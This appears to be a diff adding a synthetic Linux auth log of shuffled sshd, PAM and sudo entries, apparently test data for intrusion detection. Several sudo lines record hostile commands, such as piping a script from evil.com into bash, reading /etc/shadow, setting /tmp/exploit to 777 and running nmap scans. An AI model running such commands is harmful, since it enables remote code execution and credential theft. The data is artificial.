@@ -1,0 +1,200 @@
+Dec 22 15:06:01 server sshd[2678]: Failed password for oracle from 192.168.1.14 port 24886 ssh2
+Dec 22 08:47:01 server sshd[7583]: Failed password for oracle from 192.168.1.14 port 18302 ssh2
+Dec 22 05:40:01 server sshd[3674]: Failed password for oracle from 192.168.1.14 port 12571 ssh2
+Dec 22 10:36:01 server sshd[4147]: Failed password for oracle from 192.168.1.14 port 63842 ssh2
+Dec 22 09:09:01 server sshd[5362]: Failed password for oracle from 192.168.1.14 port 13605 ssh2
+Dec 22 04:20:01 server sshd[3546]: Failed password for oracle from 192.168.1.14 port 52946 ssh2
+Dec 22 15:08:01 server sshd[4260]: Failed password for oracle from 192.168.1.14 port 35059 ssh2
+Dec 22 16:51:01 server sshd[7998]: Failed password for oracle from 192.168.1.14 port 41014 ssh2
+Dec 22 01:04:01 server sshd[3149]: Failed password for oracle from 192.168.1.14 port 52299 ssh2
+Dec 22 10:02:01 server sshd[2545]: Failed password for oracle from 192.168.1.14 port 54393 ssh2
+Dec 22 01:48:01 server sshd[6858]: Failed password for oracle from 192.168.1.14 port 61495 ssh2
+Dec 22 18:23:01 server sshd[9311]: Failed password for oracle from 192.168.1.14 port 47598 ssh2
+Dec 22 12:53:01 server sshd[8765]: Failed password for oracle from 192.168.1.14 port 60224 ssh2
+Dec 22 06:32:01 server sshd[1843]: Failed password for oracle from 192.168.1.14 port 54413 ssh2
+Dec 21 19:15:01 server sshd[6446]: Failed password for oracle from 192.168.1.14 port 46079 ssh2
+Dec 22 03:30:01 server sshd[6679]: Accepted password for oracle from 192.168.1.14 port 10070 ssh2
+Dec 22 12:24:01 server sshd[3222]: error: PAM: Authentication failure for user2 from 192.168.1.31
+Dec 22 12:03:01 server sshd[1437]: Connection closed by 192.168.1.1 port 13559
+Dec 22 18:17:01 server sshd[2895]: reverse mapping checking getaddrinfo for 192.168.1.33 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 01:54:01 server sshd[3061]: reverse mapping checking getaddrinfo for 192.168.1.20 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 07:09:01 server sshd[6873]: error: PAM: Authentication failure for test from 192.168.1.29
+Dec 22 14:05:01 server sshd[4168]: Invalid user oracle from 192.168.1.49 port 31482
+Dec 21 21:10:01 server sshd[4612]: Accepted password for admin from 192.168.1.37 port 54365 ssh2
+Dec 22 00:36:01 server sshd[9846]: error: PAM: Authentication failure for user1 from 192.168.1.21
+Dec 22 08:55:01 server sudo: oracle : TTY=pts/0 ; PWD=/home/oracle ; USER=root ; COMMAND=nmap -sS 192.168.1.0/24
+Dec 22 16:42:01 server sshd[6254]: error: PAM: Authentication failure for admin from 192.168.1.6
+Dec 22 18:27:01 server sshd[3420]: error: PAM: Authentication failure for oracle from 192.168.1.3
+Dec 22 14:00:01 server sshd[7669]: reverse mapping checking getaddrinfo for 192.168.1.14 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 04:02:01 server sshd[4594]: Invalid user ubuntu from 192.168.1.25 port 11540
+Dec 22 03:27:01 server sudo: user2 : TTY=pts/0 ; PWD=/home/user2 ; USER=root ; COMMAND=chmod 777 /tmp/exploit
+Dec 22 02:49:01 server sshd[4838]: reverse mapping checking getaddrinfo for 192.168.1.8 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 12:45:01 server sshd[5622]: reverse mapping checking getaddrinfo for 192.168.1.35 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 10:18:01 server sshd[4499]: reverse mapping checking getaddrinfo for 192.168.1.9 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 11:45:01 server sshd[2078]: error: PAM: Authentication failure for user2 from 192.168.1.15
+Dec 22 07:00:01 server sudo: oracle : TTY=pts/0 ; PWD=/home/oracle ; USER=root ; COMMAND=whoami
+Dec 22 08:26:01 server sshd[9065]: Failed password for user2 from 192.168.1.37 port 18433 ssh2
+Dec 22 16:49:01 server sshd[7995]: reverse mapping checking getaddrinfo for 192.168.1.38 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 01:33:01 server sudo: test : TTY=pts/0 ; PWD=/home/test ; USER=root ; COMMAND=nmap -sS 192.168.1.0/24
+Dec 22 18:22:01 server sshd[3228]: Invalid user oracle from 192.168.1.24 port 12418
+Dec 21 22:58:01 server sshd[2219]: reverse mapping checking getaddrinfo for 192.168.1.39 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 21 22:23:01 server sshd[2445]: error: PAM: Authentication failure for user1 from 192.168.1.40
+Dec 22 14:45:01 server sshd[5530]: Accepted password for ubuntu from 192.168.1.44 port 25138 ssh2
+Dec 22 01:50:01 server sshd[5752]: Failed password for user1 from 192.168.1.36 port 28438 ssh2
+Dec 22 16:19:01 server sshd[2913]: Connection closed by 192.168.1.42 port 25466
+Dec 22 08:46:01 server sshd[4314]: reverse mapping checking getaddrinfo for 192.168.1.12 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 00:00:01 server sshd[3233]: reverse mapping checking getaddrinfo for 192.168.1.18 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 13:18:01 server sshd[1224]: Connection closed by 192.168.1.9 port 23207
+Dec 22 08:33:01 server sshd[9488]: Connection closed by 192.168.1.1 port 14628
+Dec 22 00:54:01 server sshd[4600]: Accepted password for ubuntu from 192.168.1.41 port 44663 ssh2
+Dec 22 01:18:01 server sshd[5355]: Connection closed by 192.168.1.7 port 21654
+Dec 22 08:34:01 server sshd[2334]: error: PAM: Authentication failure for admin from 192.168.1.42
+Dec 22 14:07:01 server sshd[9059]: Invalid user user2 from 192.168.1.39 port 62193
+Dec 22 08:00:01 server sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=chmod 777 /tmp/exploit
+Dec 22 08:05:01 server sudo: user2 : TTY=pts/0 ; PWD=/home/user2 ; USER=root ; COMMAND=cat /etc/shadow
+Dec 22 05:23:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=curl http://evil.com/script.sh | bash
+Dec 22 03:08:01 server sshd[7062]: Accepted password for oracle from 192.168.1.23 port 19921 ssh2
+Dec 22 03:31:01 server sshd[3701]: error: PAM: Authentication failure for oracle from 192.168.1.46
+Dec 22 04:53:01 server sshd[6618]: Accepted password for ubuntu from 192.168.1.8 port 61166 ssh2
+Dec 22 09:43:01 server sshd[3890]: Connection closed by 192.168.1.8 port 58786
+Dec 21 22:44:01 server sshd[5284]: Accepted password for test from 192.168.1.27 port 49514 ssh2
+Dec 21 19:34:01 server sshd[5934]: error: PAM: Authentication failure for oracle from 192.168.1.4
+Dec 22 10:51:01 server sshd[1742]: Accepted password for oracle from 192.168.1.44 port 21267 ssh2
+Dec 22 05:50:01 server sshd[3118]: error: PAM: Authentication failure for user2 from 192.168.1.28
+Dec 22 04:10:01 server sshd[9337]: Connection closed by 192.168.1.20 port 64893
+Dec 21 23:23:01 server sshd[1847]: Invalid user admin from 192.168.1.23 port 19872
+Dec 21 22:28:01 server sshd[3186]: Invalid user ubuntu from 192.168.1.3 port 40535
+Dec 22 16:45:01 server sshd[6629]: Connection closed by 192.168.1.8 port 58947
+Dec 22 11:45:01 server sshd[5044]: error: PAM: Authentication failure for oracle from 192.168.1.10
+Dec 22 07:09:01 server sshd[4601]: error: PAM: Authentication failure for oracle from 192.168.1.44
+Dec 22 12:07:01 server sshd[3087]: Failed password for user1 from 192.168.1.12 port 45597 ssh2
+Dec 22 09:53:01 server sshd[1908]: Failed password for test from 192.168.1.15 port 57178 ssh2
+Dec 22 08:44:01 server sshd[7672]: reverse mapping checking getaddrinfo for 192.168.1.19 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 15:35:01 server sshd[4404]: Invalid user test from 192.168.1.27 port 48996
+Dec 22 02:32:01 server sshd[3630]: Invalid user admin from 192.168.1.13 port 32142
+Dec 22 08:08:01 server sshd[4721]: Failed password for oracle from 192.168.1.12 port 13645 ssh2
+Dec 22 16:47:01 server sshd[5576]: Accepted password for test from 192.168.1.43 port 57268 ssh2
+Dec 21 23:53:01 server sshd[4697]: reverse mapping checking getaddrinfo for 192.168.1.26 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 18:05:01 server sshd[1355]: Connection closed by 192.168.1.22 port 36752
+Dec 22 13:19:01 server sshd[6909]: Failed password for user1 from 192.168.1.5 port 33382 ssh2
+Dec 21 21:09:01 server sshd[6563]: error: PAM: Authentication failure for oracle from 192.168.1.32
+Dec 22 08:53:01 server sshd[9074]: Failed password for user1 from 192.168.1.17 port 38061 ssh2
+Dec 22 10:54:01 server sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=curl http://evil.com/script.sh | bash
+Dec 21 22:25:01 server sshd[5924]: Failed password for user2 from 192.168.1.19 port 30714 ssh2
+Dec 22 15:33:01 server sshd[6093]: Accepted password for test from 192.168.1.12 port 62737 ssh2
+Dec 22 10:14:01 server sshd[8470]: Accepted password for test from 192.168.1.7 port 53264 ssh2
+Dec 22 00:26:01 server sshd[5407]: Accepted password for oracle from 192.168.1.11 port 38925 ssh2
+Dec 22 00:54:01 server sshd[2881]: Failed password for root from 192.168.1.1 port 16442 ssh2
+Dec 22 06:14:01 server sshd[2473]: reverse mapping checking getaddrinfo for 192.168.1.47 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 02:59:01 server sshd[7713]: Connection closed by 192.168.1.16 port 50786
+Dec 22 16:55:01 server sudo: root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=whoami
+Dec 22 05:18:01 server sudo: root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=chmod 777 /tmp/exploit
+Dec 22 15:58:01 server sshd[4659]: Invalid user admin from 192.168.1.42 port 51300
+Dec 22 01:56:01 server sshd[7040]: error: PAM: Authentication failure for admin from 192.168.1.40
+Dec 22 01:59:01 server sshd[7203]: error: PAM: Authentication failure for user1 from 192.168.1.3
+Dec 22 08:45:01 server sshd[8428]: Failed password for user2 from 192.168.1.4 port 19847 ssh2
+Dec 22 00:38:01 server sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash
+Dec 21 21:34:01 server sshd[1455]: Connection closed by 192.168.1.21 port 54310
+Dec 22 06:08:01 server sshd[9186]: Connection closed by 192.168.1.28 port 27713
+Dec 22 05:28:01 server sshd[2211]: Invalid user oracle from 192.168.1.11 port 21584
+Dec 22 16:13:01 server sshd[2624]: Accepted password for root from 192.168.1.12 port 20884 ssh2
+Dec 21 21:36:01 server sshd[4234]: Failed password for test from 192.168.1.38 port 21752 ssh2
+Dec 22 03:53:01 server sudo: test : TTY=pts/0 ; PWD=/home/test ; USER=root ; COMMAND=chmod 777 /tmp/exploit
+Dec 22 14:11:01 server sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+Dec 22 05:06:01 server sshd[3104]: reverse mapping checking getaddrinfo for 192.168.1.11 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 09:54:01 server sshd[7329]: Invalid user oracle from 192.168.1.24 port 18294
+Dec 22 17:53:01 server sshd[9680]: Failed password for ubuntu from 192.168.1.41 port 18053 ssh2
+Dec 22 11:17:01 server sshd[5827]: error: PAM: Authentication failure for user1 from 192.168.1.7
+Dec 22 08:05:01 server sshd[9582]: error: PAM: Authentication failure for root from 192.168.1.29
+Dec 22 11:25:01 server sshd[7539]: error: PAM: Authentication failure for user2 from 192.168.1.36
+Dec 22 01:54:01 server sshd[7966]: Invalid user user1 from 192.168.1.20 port 37998
+Dec 22 10:19:01 server sshd[9668]: error: PAM: Authentication failure for test from 192.168.1.2
+Dec 22 07:22:01 server sshd[8543]: reverse mapping checking getaddrinfo for 192.168.1.13 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 17:01:01 server sshd[4458]: error: PAM: Authentication failure for admin from 192.168.1.45
+Dec 22 18:28:01 server sshd[3835]: Failed password for admin from 192.168.1.2 port 54729 ssh2
+Dec 22 10:27:01 server sshd[2447]: Failed password for user2 from 192.168.1.15 port 24372 ssh2
+Dec 22 07:52:01 server sshd[9440]: Failed password for admin from 192.168.1.21 port 55691 ssh2
+Dec 22 15:13:01 server sshd[8136]: error: PAM: Authentication failure for user2 from 192.168.1.16
+Dec 21 22:25:01 server sshd[5393]: Accepted password for oracle from 192.168.1.28 port 22298 ssh2
+Dec 22 11:44:01 server sshd[7123]: Invalid user test from 192.168.1.6 port 32903
+Dec 22 05:36:01 server sshd[3054]: Connection closed by 192.168.1.29 port 35260
+Dec 22 15:38:01 server sshd[2384]: error: PAM: Authentication failure for test from 192.168.1.15
+Dec 22 01:23:01 server sshd[4512]: reverse mapping checking getaddrinfo for 192.168.1.24 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 14:10:01 server sshd[7934]: reverse mapping checking getaddrinfo for 192.168.1.22 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 21 19:35:01 server sshd[8656]: Failed password for root from 192.168.1.30 port 38186 ssh2
+Dec 21 22:33:01 server sshd[1948]: Failed password for test from 192.168.1.49 port 38712 ssh2
+Dec 22 00:01:01 server sshd[9996]: Accepted password for root from 192.168.1.35 port 43899 ssh2
+Dec 22 15:24:01 server sshd[5041]: reverse mapping checking getaddrinfo for 192.168.1.7 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 21 23:56:01 server sshd[6972]: Accepted password for admin from 192.168.1.25 port 19225 ssh2
+Dec 21 22:18:01 server sshd[3772]: Failed password for ubuntu from 192.168.1.15 port 30686 ssh2
+Dec 22 07:04:01 server sshd[3823]: Invalid user user1 from 192.168.1.29 port 42334
+Dec 22 18:28:01 server sshd[7977]: reverse mapping checking getaddrinfo for 192.168.1.22 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 17:58:01 server sshd[3679]: error: PAM: Authentication failure for ubuntu from 192.168.1.38
+Dec 21 23:15:01 server sshd[7905]: error: PAM: Authentication failure for user2 from 192.168.1.3
+Dec 22 05:40:01 server sshd[9985]: Connection closed by 192.168.1.20 port 55385
+Dec 22 13:34:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=curl http://evil.com/script.sh | bash
+Dec 21 20:49:01 server sshd[7483]: error: PAM: Authentication failure for admin from 192.168.1.18
+Dec 22 13:54:01 server sshd[8791]: Invalid user admin from 192.168.1.25 port 30825
+Dec 22 18:12:01 server sshd[8666]: Accepted password for root from 192.168.1.39 port 47323 ssh2
+Dec 22 16:45:01 server sshd[4221]: reverse mapping checking getaddrinfo for 192.168.1.19 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 07:57:01 server sshd[7296]: Failed password for root from 192.168.1.28 port 11571 ssh2
+Dec 22 12:34:01 server sshd[2446]: Connection closed by 192.168.1.12 port 42468
+Dec 22 12:56:01 server sshd[7258]: Accepted password for user1 from 192.168.1.44 port 23007 ssh2
+Dec 22 14:15:01 server sshd[6268]: Invalid user root from 192.168.1.36 port 13861
+Dec 22 03:05:01 server sshd[1361]: Invalid user admin from 192.168.1.35 port 25696
+Dec 22 11:56:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=cat /etc/shadow
+Dec 22 05:30:01 server sshd[7400]: error: PAM: Authentication failure for admin from 192.168.1.11
+Dec 21 19:29:01 server sshd[8486]: error: PAM: Authentication failure for user2 from 192.168.1.20
+Dec 22 15:31:01 server sshd[2258]: Connection closed by 192.168.1.38 port 18029
+Dec 22 13:45:01 server sshd[3836]: Connection closed by 192.168.1.19 port 34466
+Dec 22 10:02:01 server sshd[3492]: reverse mapping checking getaddrinfo for 192.168.1.27 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 21 21:33:01 server sshd[9300]: Invalid user user1 from 192.168.1.12 port 20336
+Dec 22 16:53:01 server sshd[8631]: reverse mapping checking getaddrinfo for 192.168.1.16 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 02:37:01 server sudo: test : TTY=pts/0 ; PWD=/home/test ; USER=root ; COMMAND=/bin/bash
+Dec 22 13:16:01 server sshd[9695]: Accepted password for oracle from 192.168.1.7 port 27409 ssh2
+Dec 22 18:12:01 server sshd[9643]: reverse mapping checking getaddrinfo for 192.168.1.25 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 21 22:37:01 server sshd[8759]: error: PAM: Authentication failure for user1 from 192.168.1.36
+Dec 21 21:15:01 server sshd[1408]: error: PAM: Authentication failure for user1 from 192.168.1.45
+Dec 21 20:16:01 server sshd[5786]: reverse mapping checking getaddrinfo for 192.168.1.43 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 11:35:01 server sshd[7907]: Failed password for test from 192.168.1.27 port 56333 ssh2
+Dec 21 20:45:01 server sshd[3099]: reverse mapping checking getaddrinfo for 192.168.1.38 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 16:26:01 server sshd[4636]: reverse mapping checking getaddrinfo for 192.168.1.7 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 11:34:01 server sshd[7172]: Invalid user oracle from 192.168.1.13 port 46027
+Dec 22 00:21:01 server sshd[1087]: error: PAM: Authentication failure for user1 from 192.168.1.21
+Dec 22 10:42:01 server sshd[4380]: error: PAM: Authentication failure for ubuntu from 192.168.1.20
+Dec 22 00:08:01 server sshd[7538]: error: PAM: Authentication failure for admin from 192.168.1.13
+Dec 22 07:55:01 server sshd[2623]: reverse mapping checking getaddrinfo for 192.168.1.19 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 00:53:01 server sshd[8701]: error: PAM: Authentication failure for user2 from 192.168.1.20
+Dec 22 03:15:01 server sshd[1089]: Failed password for user1 from 192.168.1.48 port 40035 ssh2
+Dec 22 17:10:01 server sshd[7746]: Connection closed by 192.168.1.45 port 39273
+Dec 21 19:34:01 server sshd[8445]: Invalid user oracle from 192.168.1.12 port 35544
+Dec 22 13:23:01 server sshd[7641]: error: PAM: Authentication failure for test from 192.168.1.30
+Dec 22 17:28:01 server sshd[9940]: Accepted password for user1 from 192.168.1.30 port 48670 ssh2
+Dec 22 08:45:01 server sudo: user2 : TTY=pts/0 ; PWD=/home/user2 ; USER=root ; COMMAND=cat /etc/shadow
+Dec 22 17:47:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=nmap -sS 192.168.1.0/24
+Dec 22 16:11:01 server sshd[9631]: reverse mapping checking getaddrinfo for 192.168.1.1 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 11:02:01 server sshd[6946]: reverse mapping checking getaddrinfo for 192.168.1.29 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 10:52:01 server sshd[4217]: Connection closed by 192.168.1.4 port 22687
+Dec 22 16:58:01 server sshd[4630]: Failed password for test from 192.168.1.14 port 28324 ssh2
+Dec 22 06:10:01 server sshd[5261]: Accepted password for user2 from 192.168.1.20 port 21967 ssh2
+Dec 22 17:04:01 server sshd[4924]: error: PAM: Authentication failure for test from 192.168.1.14
+Dec 22 17:28:01 server sshd[7803]: Invalid user user2 from 192.168.1.20 port 31786
+Dec 22 09:58:01 server sshd[6384]: Accepted password for test from 192.168.1.21 port 15335 ssh2
+Dec 21 19:58:01 server sshd[3484]: Accepted password for admin from 192.168.1.30 port 61103 ssh2
+Dec 21 21:34:01 server sshd[6893]: reverse mapping checking getaddrinfo for 192.168.1.7 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 14:36:01 server sshd[3845]: reverse mapping checking getaddrinfo for 192.168.1.5 failed - POSSIBLE BREAK-IN ATTEMPT!
+Dec 22 07:36:01 server sshd[6460]: error: PAM: Authentication failure for admin from 192.168.1.44
+Dec 22 10:43:01 server sshd[5997]: Connection closed by 192.168.1.39 port 60767
+Dec 22 01:12:01 server sshd[6645]: Failed password for user1 from 192.168.1.11 port 60092 ssh2
+Dec 22 12:02:01 server sshd[2517]: error: PAM: Authentication failure for user1 from 192.168.1.39
+Dec 22 12:59:01 server sshd[4547]: error: PAM: Authentication failure for oracle from 192.168.1.20
+Dec 21 22:16:01 server sshd[8371]: Accepted password for oracle from 192.168.1.39 port 45192 ssh2
+Dec 22 13:01:01 server sshd[5920]: Failed password for ubuntu from 192.168.1.44 port 46229 ssh2
+Dec 22 06:41:01 server sshd[9675]: Accepted password for oracle from 192.168.1.28 port 31453 ssh2
+Dec 22 09:25:01 server sshd[1827]: Invalid user root from 192.168.1.36 port 40634
+Dec 21 22:06:01 server sshd[9641]: Failed password for admin from 192.168.1.34 port 27108 ssh2
+Dec 22 05:39:01 server sshd[2810]: Accepted password for oracle from 192.168.1.8 port 58293 ssh2
+Dec 21 23:49:01 server sshd[2990]: Failed password for ubuntu from 192.168.1.4 port 12056 ssh2
+Dec 22 04:52:01 server sshd[4771]: Invalid user user1 from 192.168.1.40 port 13776
+Dec 21 22:22:01 server sshd[1413]: Accepted password for user2 from 192.168.1.27 port 19967 ssh2
+Dec 22 03:34:01 server sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=curl http://evil.com/script.sh | bash
